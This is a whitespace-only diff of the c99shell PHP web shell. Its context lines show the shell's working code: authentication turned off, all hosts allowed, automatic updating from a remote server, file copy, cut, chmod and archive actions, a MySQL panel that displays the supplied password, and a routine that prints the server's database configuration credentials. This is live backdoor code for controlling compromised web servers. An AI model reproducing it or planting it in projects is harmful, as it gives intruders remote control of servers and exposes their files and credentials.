@@ -50,7 +50,6 @@ $md5_pass = ""; //md5-cryped pass. if null, md5($pass)
 $login = false; //turn off authentication
 
 $autoupdate = true; //Automatic updating?
-
 $updatenow = false; //If true, update now
 
 $c99sh_updatefurl = "http://ccteam.ru/releases/update/c99shell/?version=".$shver."&"; //Update server
@@ -69,7 +68,7 @@ $host_allow = array("*"); //array ("mask1","mask2",...), e.g. array("192.168.0.*
 $curdir = "./"; //start directory
 
 $tmpdir = dirname(__FILE__); //Directory for tempory files
-  
+
 // Registered file-types.
 //  array(
 //   "{action1}"=>array("ext1","ext2","ext3",...),
@@ -402,7 +401,7 @@ function view_perms($mode)
  if( $mode & 0x800 ) {$owner['execute'] = ($owner[execute]=="x") ? "s" : "S";}
  if( $mode & 0x400 ) {$group['execute'] = ($group[execute]=="x") ? "s" : "S";}
  if( $mode & 0x200 ) {$world['execute'] = ($world[execute]=="x") ? "t" : "T";}
- 
+
  return $type.$owner['read'].$owner['write'].$owner['execute'].
         $group['read'].$group['write'].$group['execute'].
         $world['read'].$world['write'].$world['execute'];
@@ -545,7 +544,7 @@ function c99fsearch($d)
       $r = @file_get_contents($d.$f);
       if ($a[text_wwo]) {$a[text] = " ".trim($a[text])." ";}
       if (!$a[text_cs]) {$a[text] = strtolower($a[text]); $r = strtolower($r);}
- 
+
       if ($a[text_regexp]) {$true = ereg($a[text],$r);}
       else {$true = strinstr($a[text],$r);}
       if ($a[text_not])
@@ -722,7 +721,7 @@ if ($act == "sql")
   $sqlquicklaunch[] = array("Server variables",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=servervars");
   $sqlquicklaunch[] = array("Processes",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=processes");
   $sqlquicklaunch[] = array("Logout",$surl."act=sql");
- 
+
   echo "<center><b>MySQL ".mysql_get_server_info()." (proto v.".mysql_get_proto_info ().") running in ".htmlspecialchars($sql_server).":".htmlspecialchars($sql_port)." as ".htmlspecialchars($sql_login)."@".htmlspecialchars($sql_server)." (password - \"".htmlspecialchars($sql_passwd)."\")</b><br>";
 
   if (count($sqlquicklaunch) > 0) {foreach($sqlquicklaunch as $item) {echo "[ <a href=\"".$item[1]."\"><u>".$item[0]."</u></a> ] ";}}
@@ -1335,7 +1334,7 @@ else
  if ($act == "copy") {$err = ""; $sess_data["copy"] = array_merge($sess_data["copy"],$actbox); c99_sess_put($sess_data); $act = "ls";}
  if ($act == "cut") {$sess_data["cut"] = array_merge($sess_data["cut"],$actbox); c99_sess_put($sess_data); $act = "ls";}
  if ($act == "unselect") {foreach ($sess_data["copy"] as $k=>$v) {if (in_array($v,$actbox)) {unset($sess_data["copy"][$k]);}} foreach ($sess_data["cut"] as $k=>$v) {if (in_array($v,$actbox)) {unset($sess_data["cut"][$k]);}} $ls_arr = array_merge($sess_data["copy"],$sess_data["cut"]); c99_sess_put($sess_data); $act = "ls";}
- 
+
  if ($actemptybuff) {$sess_data["copy"] = $sess_data["cut"] = array(); c99_sess_put($sess_data);}
  elseif ($actpastebuff)
  {
@@ -1361,7 +1360,7 @@ else
   $arcerr = "";
   if (substr($actarcbuff_path,-7,7) == ".tar.gz") {$ext = ".tar.gz";}
   else {$ext = ".tar.gz";}
-  
+
   if ($ext == ".tar.gz")
   {
    $cmdline = "tar cfzv";
@@ -1440,7 +1439,7 @@ if ($act == "ls")
   {$row[] = "<b>Owner/Group</b>";}
    $row[] = "<b>Perms</b>";
    $row[] = "<b>Action</b>";
-   
+
    $k = $sort[0];
    if ((!is_numeric($k)) or ($k > count($row)-2)) {$k = 0;}
    if (empty($sort[1])) {$sort[1] = "d";}
@@ -1452,13 +1451,13 @@ if ($act == "ls")
    {
     $y = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&sort=".$k."d\"><img src=\"".$surl."act=img&img=sort_asc\" border=\"0\"></a>";
    }
-   
+
    $row[$k] .= $y;
    for($i=0;$i<count($row)-1;$i++)
    {
     if ($i != $k) {$row[$i] = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&sort=".$i.$sort[1]."\">".$row[$i]."</a>";}
    }
-   
+
    $tab = array();
    $tab[cols] = array($row);
    $tab[head] = array();
@@ -1470,11 +1469,11 @@ if ($act == "ls")
    {
     $o = basename($v);
     $dir = dirname($v);
-     
+
     if ($disp_fullpath) {$disppath = $v;}
     else {$disppath = $o;}
     $disppath = str2mini($disppath,60);
-  
+
     if (in_array($v,$sess_data["cut"])) {$disppath = "<strike>".$disppath."</strike>";}
     elseif (in_array($v,$sess_data["copy"])) {$disppath = "<u>".$disppath."</u>";}
 
@@ -1511,14 +1510,14 @@ if ($act == "ls")
      $row[] = view_size(filesize($v));
     }
     $row[] = date("d.m.Y H:i:s",filemtime($v));
-     
+
     if (!$win)
     {
      $ow = @posix_getpwuid(fileowner($v));
      $gr = @posix_getgrgid(filegroup($v));
      $row[] = $ow["name"]."/".$gr["name"];
     }
-         
+
     if (is_writable($v)) {$row[] = "<a href=\"".$surl."act=chmod&f=".$uo."&d=".$ud."\"><font color=\"green\">".view_perms(fileperms($v))."</font></a>";}
     else {$row[] = "<a href=\"".$surl."act=chmod&f=".$uo."&d=".$ud."\"><font color=\"red\">".view_perms(fileperms($v))."</font></a>";}
 
@@ -1926,7 +1925,7 @@ array("<img src=\"".$surl."act=img&img=change\" border=\"0\">","edit")
     else echo $tmp['name'];
    }
    echo "<tr class=tr><td><b>Perms</b></td><td>";
-   
+
    if (is_writable($d.$f))
    {
     echo "<font color=\"green\">".view_perms(fileperms($d.$f))."</font>";
@@ -2072,7 +2071,7 @@ array("<img src=\"".$surl."act=img&img=change\" border=\"0\">","edit")
      "dbpasswd"=>$dbpasswd 
      );
      foreach ($cfgvars as $k=>$v) {echo htmlspecialchars($k)."='".htmlspecialchars($v)."'<br>";}
- 
+
      echo "</b>";
      echo "<hr size=\"1\" noshade>";
     }
@@ -2158,7 +2157,7 @@ if ($act == "phpinfo")
 if ($act == "img")
 {
  @ob_clean();
- 
+
  $arrimg = array(
 "arrow_ltr"=>
 "R0lGODlhJgAWAIAAAAAAAP///yH5BAUUAAEALAAAAAAmABYAAAIvjI+py+0PF4i0gVvzuVxXDnoQ".
